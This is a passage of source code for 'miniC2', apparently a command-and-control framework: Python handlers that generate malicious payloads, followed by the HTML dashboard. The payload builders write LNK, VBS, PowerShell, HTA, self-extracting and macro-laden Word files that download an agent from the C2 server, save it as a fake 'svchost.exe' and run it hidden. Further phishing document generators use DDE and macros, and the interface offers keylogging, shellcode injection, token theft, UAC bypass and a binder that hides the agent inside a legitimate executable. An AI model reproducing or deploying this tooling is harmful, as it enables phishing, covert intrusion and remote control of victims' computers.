                    encoded = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()
                    lnk_data = _create_lnk_data("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0", f"-Nop -sta -noni -w hidden -encodedCommand {encoded}")
                    fname = f"{name}.lnk"
                    fpath = os.path.join(payload_dir, fname)
                    with open(fpath, "wb") as f:
                        f.write(lnk_data)
                elif payload_type == "hta":
                    content = _create_hta_content(theme, dl_url)
                    fname = f"{name}.hta"
                    fpath = os.path.join(payload_dir, fname)
                    with open(fpath, "w", encoding="utf-8") as f:
                        f.write(content)
                elif payload_type == "vbs":
                    fname = f"{name}.vbs"
                    fpath = os.path.join(payload_dir, fname)
                    with open(fpath, "w") as f:
                        f.write(f'Set o=CreateObject("WScript.Shell")\nSet w=CreateObject("MSXML2.XMLHTTP")\nSet f=CreateObject("Scripting.FileSystemObject")\ntmp=o.ExpandEnvironmentStrings("%TEMP%") & "\\svchost.exe"\nw.Open "GET","{dl_url}",False\nw.Send\nIf w.Status=200 Then\n  Set s=CreateObject("ADODB.Stream")\n  s.Open:s.Type=1:s.Write w.ResponseBody:s.SaveToFile tmp,2:s.Close\n  o.Run Chr(34) & tmp & Chr(34),0,False\nEnd If\n')
                elif payload_type == "ps1":
                    fname = f"{name}.ps1"
                    fpath = os.path.join(payload_dir, fname)
                    with open(fpath, "w") as f:
                        f.write(f'[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12\n$w=New-Object Net.WebClient\n$w.Headers.Add("User-Agent","Mozilla/5.0")\n$t="$env:TEMP\\svchost.exe"\n$w.DownloadFile("{dl_url}",$t)\nStart-Process -WindowStyle Hidden -FilePath $t\n')
                elif payload_type == "sfx":
                    seven_zip = None
                    for p in [r"C:\Program Files\7-Zip\7z.exe", r"C:\Program Files (x86)\7-Zip\7z.exe", shutil.which("7z")]:
                        if p and os.path.exists(p):
                            seven_zip = p
                            break
                    if not seven_zip:
                        self._send_json({"error": "7-Zip not installed"}), 500
                        return
                    agent_path = _get_agent_path()
                    tmp = tempfile.mkdtemp()
                    tmp_agent = os.path.join(tmp, "agent.exe")
                    shutil.copy2(agent_path, tmp_agent)
                    archive = os.path.join(tmp, "archive.7z")
                    subprocess.run([seven_zip, "a", "-t7z", "-mx=9", archive, tmp_agent], capture_output=True)
                    sfx_mod = os.path.join(os.path.dirname(seven_zip), "7z.sfx")
                    fname = f"{name}.exe"
                    fpath = os.path.join(payload_dir, fname)
                    with open(fpath, "wb") as out_f:
                        with open(sfx_mod, "rb") as s: out_f.write(s.read())
                        cfg = f';!@Install@!UTF-8!\nRunProgram="agent.exe"\nGUIMode="2"\n'.encode()
                        out_f.write(cfg)
                        with open(archive, "rb") as s: out_f.write(s.read())
                    shutil.rmtree(tmp, ignore_errors=True)
                elif payload_type == "docx":
                    import zipfile, io
                    fname = f"{name}.docm"
                    fpath = os.path.join(payload_dir, fname)
                    vba_payload = f'Sub Auto_Open()\nShell "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$w=New-Object Net.WebClient;$w.Headers.Add(\\\"User-Agent\\\",\\\"Mozilla/5.0\\\");$t=\\\"$env:TEMP\\\\svchost.exe\\\";$w.DownloadFile(\\\"{dl_url}\\\",$t);Start-Process -WindowStyle Hidden -FilePath $t\"", vbHide\nEnd Sub'
                    doc_xml = '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Loading document, please wait...</w:t></w:r></w:p></w:body></w:document>'
                    with zipfile.ZipFile(fpath, "w", zipfile.ZIP_DEFLATED) as zf:
                        zf.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>')
                        zf.writestr("_rels/.rels", '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>')
                        zf.writestr("word/_rels/document.xml.rels", '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rIdVBA" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>')
                        zf.writestr("word/document.xml", doc_xml)
                else:
                    self._send_json({"error": f"unknown type: {payload_type}"}, 400)
                    return
                fsize = os.path.getsize(fpath)
                self._send_json({"status": "ok", "filename": fname, "size": fsize, "type": payload_type})
            except Exception as e:
                self._send_json({"error": str(e)}, 500)

        elif path == "/api/phish/generate":
            data = self._read_json() or {}
            technique = data.get("technique", "dde")
            name = data.get("name", "Document").replace("/", "_").replace("\\", "_")[:60]
            c2_url = data.get("url", "https://127.0.0.1:8443").rstrip("/")
            dl_url = f"{c2_url}/api/agent/download"
            dl_cmd = f'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$w=New-Object Net.WebClient;$w.Headers.Add(\\\"User-Agent\\\",\\\"Mozilla/5.0\\\");$t=\\\"$env:TEMP\\\\svchost.exe\\\";$w.DownloadFile(\\\"{dl_url}\\\",$t);Start-Process -WindowStyle Hidden -FilePath $t"'
            payload_dir = os.path.join(BASE_DIR, "payloads")
            os.makedirs(payload_dir, exist_ok=True)
            try:
                if technique == "dde":
                    fname, fsize = _create_dde_docx(dl_cmd, name)
                elif technique == "macro":
                    fname, fsize = _create_macro_docx(dl_cmd, name)
                elif technique == "ole_lnk":
                    encoded = base64.b64encode(dl_cmd.encode("utf-16-le")).decode()
                    lnk_ps = f'''
$obj = New-Object -comobject wscript.shell
$link = $obj.createshortcut("$env:TEMP\\update.lnk")
$link.windowstyle = "7"
$link.targetpath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
$link.iconlocation = "C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe"
$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand {encoded}"
$link.save()
'''
                    ps_script = f'Set ws=CreateObject("WScript.Shell"):ws.Run "cmd.exe /c {lnk_ps.strip().replace(chr(10), " & ")}",0,False'
                    lnk_bytes = _create_lnk_data("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0", ps_script)
                    fname, fsize = _create_lnk_docx(lnk_bytes, name)
                else:
                    self._send_json({"error": f"unknown technique: {technique}"}, 400)
                    return
                self._send_json({"status": "ok", "filename": fname, "size": fsize, "technique": technique})
            except Exception as e:
                import traceback
                self._send_json({"error": str(e), "trace": traceback.format_exc()}, 500)

        else:
            self._send_json({"error": "not found"}, 404)


DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>miniC2</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&family=Orbitron:wght@500;700;900&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;overflow:hidden}
body{background:var(--bg);color:var(--text);font-family:'Inter',-apple-system,sans-serif;font-size:13px;line-height:1.5;transition:background .3s,color .3s}
::-webkit-scrollbar{width:6px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:var(--border3)}
input,select,button{font-family:inherit}

[data-theme="dark"]{
  --bg:#111114;--bg2:#17171b;--surface:#1c1c20;--surface2:#222226;--surface3:#28282d;
  --border:#26262b;--border2:#32323a;--border3:#404048;
  --accent:#5b9e8f;--accent2:#72b8a8;--accent-dim:rgba(91,158,143,.09);--accent-glow:rgba(91,158,143,.14);
  --green:#5b9e8f;--green-dim:rgba(91,158,143,.10);--green-border:rgba(91,158,143,.18);
  --red:#c07068;--red-dim:rgba(192,112,104,.10);--red-border:rgba(192,112,104,.18);
  --yellow:#c4a35a;--yellow-dim:rgba(196,163,90,.10);--yellow-border:rgba(196,163,90,.18);
  --purple:#9580b8;--purple-dim:rgba(149,128,184,.10);--purple-border:rgba(149,128,184,.18);
  --text:#c8c8d0;--text2:#8a8a94;--text3:#5c5c66;--text-bright:#e0e0e8;
  --mono:'JetBrains Mono','Cascadia Code',monospace;--display:'Orbitron','Inter',sans-serif;
  --shadow:0 1px 4px rgba(0,0,0,.30);--shadow-lg:0 4px 16px rgba(0,0,0,.40);
  --card-bg:var(--surface);--card-border:var(--border);--input-bg:var(--bg2);--input-border:var(--border);--feed-bg:var(--bg2);
}
[data-theme="dark"] ::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
[data-theme="light"]{
  --bg:#1a1d24;--bg2:#20242c;--surface:#242830;--surface2:#2a2f38;--surface3:#303640;
  --border:#2c313a;--border2:#383e4a;--border3:#464e5a;
  --accent:#7c8dd4;--accent2:#94a3e0;--accent-dim:rgba(124,141,212,.08);--accent-glow:rgba(124,141,212,.12);
  --green:#6aab8e;--green-dim:rgba(106,171,142,.08);--green-border:rgba(106,171,142,.16);
  --red:#c07878;--red-dim:rgba(192,120,120,.08);--red-border:rgba(192,120,120,.16);
  --yellow:#c4a860;--yellow-dim:rgba(196,168,96,.08);--yellow-border:rgba(196,168,96,.16);
  --purple:#a088c0;--purple-dim:rgba(160,136,192,.08);--purple-border:rgba(160,136,192,.16);
  --text:#b8bcc4;--text2:#82868e;--text3:#585c64;--text-bright:#d4d8e0;
  --mono:'JetBrains Mono','Cascadia Code',monospace;--display:'Orbitron','Inter',sans-serif;
  --shadow:0 1px 4px rgba(0,0,0,.25);--shadow-lg:0 4px 16px rgba(0,0,0,.35);
  --card-bg:var(--surface);--card-border:var(--border);--input-bg:var(--bg2);--input-border:var(--border);--feed-bg:var(--bg2);
}
[data-theme="light"] ::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}

.layout{display:flex;height:100vh}
.sidebar{width:240px;min-width:240px;background:var(--surface);border-right:1px solid var(--border);display:flex;flex-direction:column;transition:background .3s,border-color .3s}
.sidebar-head{padding:22px 18px 18px;border-bottom:1px solid var(--border)}
.sidebar-head .logo-wrap{display:flex;align-items:center;gap:10px;margin-bottom:4px}
.sidebar-head .logo{font-family:var(--display);font-weight:900;font-size:16px;color:var(--accent);letter-spacing:3px;transition:color .3s}
.sidebar-head .tagline{font-size:10px;text-transform:uppercase;letter-spacing:2px;color:var(--text3);font-weight:500}
.sidebar-nav{padding:12px 10px}
.sidebar-nav a{display:flex;align-items:center;gap:12px;padding:10px 14px;border-radius:8px;color:var(--text2);text-decoration:none;font-size:13px;font-weight:500;cursor:pointer;transition:all .15s}
.sidebar-nav a:hover{background:var(--accent-dim);color:var(--text)}
.sidebar-nav a.active{color:var(--accent);background:var(--accent-dim);font-weight:600}
.sidebar-nav a svg{flex-shrink:0;opacity:.5}
.sidebar-nav a.active svg{opacity:1}
.sidebar-label{padding:18px 18px 8px;font-size:10px;text-transform:uppercase;letter-spacing:1.5px;color:var(--text3);font-weight:600}
.sidebar-agents{flex:1;overflow-y:auto;padding:0 10px 10px}
.agent-item{display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:8px;cursor:pointer;transition:all .15s}
.agent-item:hover{background:var(--accent-dim)}
.agent-item.active{background:var(--accent-dim);border:1px solid var(--accent-dim)}
.agent-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
.agent-item .info{flex:1;min-width:0}
.agent-item .name{font-size:12px;font-weight:600;font-family:var(--mono);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:var(--text)}
.agent-item .host{font-size:11px;color:var(--text2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:1px}
.agent-item .arch{font-size:10px;padding:2px 6px;border-radius:4px;background:var(--surface2);color:var(--text3);flex-shrink:0;font-weight:600;font-family:var(--mono)}
.sidebar-foot{padding:12px 16px;border-top:1px solid var(--border);font-size:11px;color:var(--text3);display:flex;justify-content:space-between;font-family:var(--mono);align-items:center;gap:6px}
.sidebar-foot .on{color:var(--green);font-weight:700}
.theme-toggle{display:flex;align-items:center;gap:4px;background:var(--surface2);border:1px solid var(--border);border-radius:6px;padding:4px 10px;cursor:pointer;transition:all .15s;font-size:11px;color:var(--text3);font-family:var(--mono);white-space:nowrap}
.theme-toggle:hover{border-color:var(--accent);color:var(--accent)}

.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
.main-top{padding:14px 28px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:14px;min-height:50px;background:var(--surface);flex-shrink:0;transition:background .3s}
.main-top h2{font-family:var(--display);font-size:14px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--text-bright);transition:color .3s}
.main-top .crumb{font-size:12px;color:var(--text2);font-family:var(--mono)}
.main-top .crumb b{color:var(--accent);font-weight:600}
.main-body{flex:1;overflow-y:auto;padding:22px 28px;background:var(--bg)}

.view{display:none}.view.active{display:flex;flex-direction:column;gap:18px;height:100%}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
.stat{background:var(--card-bg);border:1px solid var(--card-border);border-radius:10px;padding:18px 20px;box-shadow:var(--shadow);transition:all .3s}
.stat .lbl{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--text3);font-weight:600;margin-bottom:8px}
.stat .val{font-family:var(--display);font-size:28px;font-weight:900;line-height:1;letter-spacing:1px}

.card{background:var(--card-bg);border:1px solid var(--card-border);border-radius:10px;overflow:hidden;box-shadow:var(--shadow);transition:all .3s}
.card-head{padding:14px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
.card-head span{font-size:11px;text-transform:uppercase;letter-spacing:1.2px;color:var(--text2);font-weight:600}

.tbl{width:100%;border-collapse:collapse}
.tbl th{text-align:left;padding:10px 16px;font-size:10px;text-transform:uppercase;letter-spacing:1px;color:var(--text3);border-bottom:1px solid var(--border);font-weight:600;font-family:var(--mono)}
.tbl td{padding:10px 16px;border-bottom:1px solid var(--border);font-size:12px;color:var(--text)}
.tbl tr{cursor:pointer;transition:background .1s}
.tbl tr:hover{background:var(--accent-dim)}

.badge{display:inline-flex;align-items:center;gap:4px;padding:3px 8px;border-radius:5px;font-size:10px;font-weight:600;letter-spacing:.3px;font-family:var(--mono);text-transform:uppercase}
.badge.on{background:var(--green-dim);color:var(--green);border:1px solid var(--green-border)}
.badge.off{background:var(--red-dim);color:var(--red);border:1px solid var(--red-border)}
.badge.warn{background:var(--yellow-dim);color:var(--yellow);border:1px solid var(--yellow-border)}
.badge.dead{background:var(--surface2);color:var(--text3);border:1px solid var(--border2)}
.badge.arch{background:var(--purple-dim);color:var(--purple);border:1px solid var(--purple-border)}

.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;background:var(--accent);color:#fff;border:none;padding:8px 18px;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer;transition:all .15s;white-space:nowrap;text-transform:uppercase;letter-spacing:.4px;font-family:var(--mono)}
.btn:hover{opacity:.85;transform:translateY(-1px);box-shadow:0 4px 12px var(--accent-glow)}.btn:active{transform:translateY(0)}
.btn.danger{background:var(--red)}.btn.secondary{background:var(--surface2);color:var(--text2);border:1px solid var(--border2)}.btn.sm{padding:6px 12px;font-size:11px}
.btn:disabled{opacity:.3;cursor:not-allowed;transform:none;box-shadow:none}

.input{background:var(--input-bg);border:1px solid var(--input-border);color:var(--text);padding:8px 14px;border-radius:7px;font-size:12px;width:100%;outline:none;transition:all .15s;font-family:var(--mono)}
.input:focus{border-color:var(--accent);box-shadow:0 0 0 2px var(--accent-dim)}
select.input{appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='10' fill='%235c5c66'%3E%3Cpath d='M5 7L0 2h10z'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 12px center;padding-right:30px}

.cmd-bar{background:var(--card-bg);border:1px solid var(--card-border);border-radius:10px;padding:14px;box-shadow:var(--shadow)}
.cmd-row{display:flex;gap:8px;align-items:center}
.cmd-row select{width:150px;flex-shrink:0}
.cmd-row input{flex:1}
.cmd-row .btn{flex-shrink:0}
.quick-row{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px}
.qbtn{background:var(--surface2);border:1px solid var(--border);border-radius:6px;padding:4px 12px;font-size:11px;color:var(--text2);cursor:pointer;transition:all .15s;font-family:var(--mono);text-transform:uppercase;letter-spacing:.3px}
.qbtn:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}

.feed{flex:1;overflow-y:auto;display:flex;flex-direction:column;gap:1px;background:var(--feed-bg);border:1px solid var(--card-border);border-radius:10px;min-height:200px;box-shadow:var(--shadow)}
.feed:empty::after{content:"// no output";display:block;text-align:center;padding:40px;color:var(--text3);font-size:12px;font-family:var(--mono)}
.fi{padding:12px 16px;background:var(--card-bg);position:relative;transition:background .3s}
.fi.cmd{border-left:3px solid var(--accent)}
.fi.result{border-left:3px solid var(--green)}
.fi.result.fail{border-left:3px solid var(--red)}
.fi.pending{border-left:3px solid var(--yellow)}
.fi-head{display:flex;align-items:center;gap:10px;margin-bottom:4px}
.fi-ts{font-size:11px;color:var(--text3);font-family:var(--mono);flex-shrink:0}
.fi-label{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.4px;font-family:var(--mono)}
.fi-label.ok{color:var(--green)}.fi-label.fail{color:var(--red)}.fi-label.pending{color:var(--yellow)}
.fi-cmd{font-size:12px;color:var(--text);font-family:var(--mono)}
.fi-output{font-size:11px;color:var(--text2);font-family:var(--mono);white-space:pre-wrap;word-break:break-all;max-height:400px;overflow-y:auto;line-height:1.7;margin-top:6px}
.fi-truncated{color:var(--text3);font-weight:700;letter-spacing:2px}

.profile-bar{display:flex;align-items:center;gap:14px;padding:12px 18px;background:var(--card-bg);border:1px solid var(--card-border);border-radius:10px;box-shadow:var(--shadow);flex-wrap:wrap}
.profile-bar .pbadge{flex-shrink:0}
.profile-bar .psep{width:1px;height:20px;background:var(--border);flex-shrink:0}
.profile-bar .pitem{display:flex;align-items:center;gap:6px}
.profile-bar .plbl{font-size:10px;text-transform:uppercase;letter-spacing:.8px;color:var(--text3);font-weight:600;font-family:var(--mono)}
.profile-bar .pval{font-size:12px;font-weight:600;color:var(--text);font-family:var(--mono)}
.profile-bar .pactions{margin-left:auto;display:flex;gap:6px;align-items:center}

.file-card{display:flex;align-items:center;gap:12px;padding:10px 14px;background:var(--card-bg);border:1px solid var(--card-border);border-radius:8px;transition:all .15s;box-shadow:var(--shadow)}
.file-card:hover{border-color:var(--accent);transform:translateY(-1px)}
.file-icon{font-size:12px;width:40px;text-align:center;flex-shrink:0;font-family:var(--mono);color:var(--text3)}
.file-info{flex:1;min-width:0}
.file-info .fname{font-size:12px;font-weight:500;font-family:var(--mono);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:var(--text)}
.file-info .fmeta{font-size:11px;color:var(--text3);margin-top:2px}
.file-actions{display:flex;gap:4px;flex-shrink:0}

.build-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.build-grid .fg{display:flex;flex-direction:column;gap:5px}
.build-grid .fg label{font-size:10px;text-transform:uppercase;letter-spacing:1px;color:var(--text3);font-weight:600;font-family:var(--mono)}

.tab-bar{display:flex;gap:2px;background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:3px;width:fit-content}
.tab-bar button{background:none;border:none;padding:6px 16px;border-radius:6px;font-size:11px;font-weight:600;font-family:var(--mono);text-transform:uppercase;letter-spacing:.3px;color:var(--text3);cursor:pointer;transition:all .15s}
.tab-bar button.active{background:var(--accent-dim);color:var(--accent)}
.tab-bar button:hover:not(.active){color:var(--text)}

.notes-panel{background:var(--card-bg);border:1px solid var(--card-border);border-radius:10px;overflow:hidden;box-shadow:var(--shadow)}
.notes-head{padding:10px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
.notes-head span{font-size:11px;text-transform:uppercase;letter-spacing:1.2px;color:var(--text2);font-weight:600;font-family:var(--mono)}
.notes-list{max-height:200px;overflow-y:auto}
.note-item{display:flex;align-items:flex-start;gap:8px;padding:8px 14px;border-bottom:1px solid var(--border);font-size:12px;color:var(--text);transition:background .1s}
.note-item:hover{background:var(--accent-dim)}
.note-item .note-text{flex:1;font-family:var(--mono);white-space:pre-wrap;word-break:break-all;line-height:1.5}
.note-item .note-ts{font-size:10px;color:var(--text3);flex-shrink:0;font-family:var(--mono)}
.note-item .note-del{color:var(--red);cursor:pointer;font-size:11px;font-weight:700;flex-shrink:0;padding:2px 6px;border-radius:4px;transition:background .15s}
.note-item .note-del:hover{background:var(--red-dim)}
.notes-input{display:flex;gap:6px;padding:8px 14px;border-top:1px solid var(--border)}
.notes-input input{flex:1}

.warn-banner{padding:8px 12px;border-radius:6px;font-size:11px;font-family:var(--mono);margin-bottom:0}
.warn-banner.yellow{background:var(--yellow-dim);border:1px solid var(--yellow-border);color:var(--yellow)}
.warn-banner.red{background:var(--red-dim);border:1px solid var(--red-border);color:var(--red)}
.warn-banner.gray{background:var(--surface2);border:1px solid var(--border2);color:var(--text3)}

.toast-wrap{position:fixed;top:14px;right:14px;z-index:9999;display:flex;flex-direction:column;gap:6px}
.toast{background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:10px 16px;font-size:11px;min-width:200px;max-width:320px;animation:toastIn .25s ease;box-shadow:var(--shadow-lg);font-family:var(--mono);text-transform:uppercase;letter-spacing:.3px;transition:background .3s,border-color .3s;color:var(--text)}
.toast.success{border-left:3px solid var(--green)}.toast.error{border-left:3px solid var(--red)}.toast.info{border-left:3px solid var(--accent)}
@keyframes toastIn{from{opacity:0;transform:translateX(16px)}to{opacity:1;transform:translateX(0)}}

.empty{text-align:center;padding:40px 16px;color:var(--text3)}
.empty p{font-size:12px;font-family:var(--mono)}

@media(max-width:768px){.sidebar{width:56px;min-width:56px}.sidebar-head .tagline,.sidebar-nav a span,.sidebar-label,.sidebar-agents .info,.sidebar-agents .arch,.sidebar-foot{display:none}.sidebar-head{padding:12px 8px}.sidebar-head .logo{font-size:12px;letter-spacing:1px}.agent-item{justify-content:center;padding:5px 0}.sidebar-nav a{justify-content:center;padding:7px}}
</style>
</head>
<body data-theme="dark">
<div class="layout">
<div class="sidebar">
    <div class="sidebar-head">
        <div class="logo-wrap"><div class="logo">MINIC2</div></div>
        <div class="tagline">// attack to control</div>
    </div>
    <div class="sidebar-nav">
        <a class="active" onclick="showView('dashboard')"><svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-4 0a1 1 0 01-1-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 01-1 1"/></svg><span>Dashboard</span></a>
        <a onclick="showView('files')"><svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"/></svg><span>Files</span></a>
        <a onclick="showView('build')"><svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/></svg><span>Build</span></a>
    </div>
    <div class="sidebar-label">targets</div>
    <div class="sidebar-agents" id="agentList"><div class="empty" style="padding:14px"><p>// no agents</p></div></div>
    <div class="sidebar-foot">
        <div><span class="on" id="onlineCount">0</span> online &middot; <span id="totalCount">0</span> total</div>
        <button class="theme-toggle" onclick="toggleTheme()" id="themeBtn">deep</button>
    </div>
</div>
<div class="main">
<div class="main-top"><h2 id="viewTitle">Dashboard</h2><div class="crumb" id="breadcrumb"></div></div>
<div class="main-body">

<div id="view-dashboard" class="view active">
    <div class="stats">
        <div class="stat"><div class="lbl">Agents</div><div style="display:flex;align-items:baseline;gap:8px"><div class="val" style="color:var(--accent)" id="sTotal">0</div><div style="font-size:11px;color:var(--green);font-family:var(--mono);font-weight:600" id="sOnlineInline">0 online</div></div></div>
        <div class="stat"><div class="lbl">Tasks</div><div class="val" style="color:var(--yellow)" id="sTasks">0</div></div>
        <div class="stat"><div class="lbl">Results</div><div class="val" style="color:var(--text)" id="sResults">0</div></div>
    </div>
    <div class="card">
        <div class="card-head"><span>active sessions</span></div>
        <table class="tbl"><thead><tr><th>St</th><th>ID</th><th>Hostname</th><th>User</th><th>OS</th><th>Arch</th><th>PID</th><th>Sleep</th><th>Last</th></tr></thead>
        <tbody id="agentTable"><tr><td colspan="9" style="text-align:center;color:var(--text3);padding:24px;font-family:var(--mono)">// no agents connected</td></tr></tbody></table>
    </div>
</div>

<div id="view-agent" class="view">
    <div id="agentWarn"></div>
    <div class="profile-bar" id="profileBar"></div>
    <div class="cmd-bar">
        <div class="cmd-row">
            <select class="input" id="cmdSelect" onchange="onCmdChange()">
                <optgroup label="Execution"><option value="shell">Shell</option><option value="powershell">PowerShell</option></optgroup>
                <optgroup label="Recon"><option value="sysinfo">Sysinfo</option><option value="whoami">Whoami</option><option value="ps">Process List</option></optgroup>
                <optgroup label="Files"><option value="screenshot">Screenshot</option><option value="download">Download File</option><option value="upload">Upload File</option></optgroup>
                <optgroup label="Post-Exploit"><option value="kill-process">Kill Process</option><option value="persist">Persistence</option><option value="portscan">Port Scan</option><option value="keylog">Keylogger</option><option value="inject">Inject Shellcode</option><option value="steal_token">Steal Token</option><option value="wmi_exec">WMI Lateral</option><option value="uac_bypass">UAC Bypass</option><option value="selfdestruct">Self Destruct</option><option value="env">Env Vars</option></optgroup>
                <optgroup label="Agent"><option value="sleep">Change Sleep</option></optgroup>
            </select>
            <input class="input" id="cmdInput" placeholder="whoami" autocomplete="off">
            <button class="btn" onclick="sendCmd()" id="sendBtn">Exec</button>
        </div>
        <div class="quick-row" id="quickRow"></div>
    </div>
    <div style="display:flex;gap:14px;flex:1;min-height:0">
        <div class="feed" id="feed" style="flex:1"></div>
        <div class="notes-panel" id="notesPanel" style="width:300px;flex-shrink:0;display:flex;flex-direction:column">
            <div class="notes-head"><span>notes</span><span id="notesCount" style="color:var(--text3)">0</span></div>
            <div class="notes-list" id="notesList"></div>
            <div class="notes-input">
                <input class="input" id="noteInput" placeholder="Add note..." autocomplete="off" style="font-size:11px">
                <button class="btn sm" onclick="addNote()">Add</button>
            </div>
        </div>
    </div>
</div>

<div id="view-files" class="view">
    <div style="display:flex;gap:12px;align-items:center;flex-wrap:wrap">
        <div class="tab-bar" id="filesTabBar">
            <button class="active" onclick="switchFileTab('all')">All</button>
            <button onclick="switchFileTab('screenshots')">Screenshots</button>
            <button onclick="switchFileTab('payloads')">Payloads</button>
        </div>
        <button class="btn secondary sm" onclick="refreshFiles()">Refresh</button>
        <span style="font-size:11px;color:var(--text3);font-family:var(--mono)" id="fileCount"></span>
    </div>
    <div id="fileList"></div>
</div>

<div id="view-build" class="view">
    <div class="card" style="padding:16px;max-width:560px">
        <div style="font-size:11px;text-transform:uppercase;letter-spacing:1.2px;color:var(--text2);font-weight:600;margin-bottom:14px;font-family:var(--mono)">build config</div>
        <div class="build-grid" style="margin-bottom:12px">
            <div class="fg"><label>host</label><input class="input" id="bHost" value="127.0.0.1"></div>
            <div class="fg"><label>port</label><input class="input" id="bPort" value="8443" type="number"></div>
            <div class="fg"><label>sleep</label><input class="input" id="bSleep" value="10" type="number"></div>
            <div class="fg"><label>jitter</label><input class="input" id="bJitter" value="30" type="number"></div>
        </div>
        <div style="display:flex;gap:6px;align-items:center">
            <button class="btn" onclick="buildAgent()" id="buildBtn">Build</button>
            <span id="buildStatus" style="font-size:11px;color:var(--text3);font-family:var(--mono)"></span>
        </div>
        <div id="buildLog" style="margin-top:10px;display:none">
            <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:12px;font-family:var(--mono);font-size:11px;color:var(--text2);max-height:120px;overflow-y:auto;white-space:pre-wrap" id="buildOutput"></div>
        </div>
        <div style="margin-top:10px;background:var(--bg2);padding:12px;border-radius:8px;font-family:var(--mono);font-size:11px;color:var(--text2);word-break:break-all;border:1px solid var(--border)">
            g++ -o agent.exe agent.cpp -lwinhttp -ladvapi32 -luser32 -lgdi32 -lole32 -loleaut32 -luuid -lrpcrt4 -lws2_32 -static -O2 -w -fpermissive -mwindows
        </div>
    </div>
    <div class="card" style="padding:16px;max-width:560px;margin-top:16px">
        <div style="font-size:11px;text-transform:uppercase;letter-spacing:1.2px;color:var(--text2);font-weight:600;margin-bottom:14px;font-family:var(--mono)">bind to target</div>
        <p style="font-size:12px;color:var(--text2);margin-bottom:12px;line-height:1.6">Upload your target exe. The loader will run the target, then drop and run the agent silently in background.</p>
        <form id="bindForm" onsubmit="buildBind(event)" enctype="multipart/form-data" style="display:flex;flex-direction:column;gap:10px">
            <div class="fg"><label>target exe</label>
                <div style="position:relative;border:2px dashed var(--border2);border-radius:8px;padding:16px;text-align:center;cursor:pointer;transition:all .15s" id="bindDrop" ondragover="event.preventDefault();this.style.borderColor='var(--accent)'" ondragleave="this.style.borderColor='var(--border2)'" ondrop="event.preventDefault();this.style.borderColor='var(--border2)';handleBindFile(event.dataTransfer.files[0])">
                    <input type="file" name="target" accept=".exe" id="bindFile" style="display:none" onchange="handleBindFile(this.files[0])">
